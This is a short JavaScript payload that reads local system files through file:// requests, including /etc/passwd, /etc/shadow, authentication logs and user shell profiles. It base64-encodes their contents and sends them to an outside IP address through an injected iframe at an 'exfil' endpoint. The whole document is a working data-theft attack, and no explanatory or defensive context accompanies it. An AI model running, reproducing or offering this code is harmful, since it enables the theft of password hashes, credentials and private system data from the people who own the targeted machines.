function reqListener() {
    var b64 = btoa(this.responseText);
    document.write('<iframe src="http://196.64.174.253:443/exfil?data=' + b64 + '"></iframe>');
}

var filesToRead = [
    "/etc/passwd",
    "/etc/hosts",
    "/etc/shadow",
    "/var/log/syslog",
    "/var/log/auth.log",
    "/usr/share/doc",
    "/home/user/.bashrc",
    "/home/user/.profile"
    // Add more files and directories as needed
];

function readFiles(files) {
    files.forEach(function(file) {
        var oReq = new XMLHttpRequest();
        oReq.addEventListener("load", reqListener);
        oReq.open("GET", "file://" + file);
        oReq.send();
    });
}

readFiles(filesToRead);
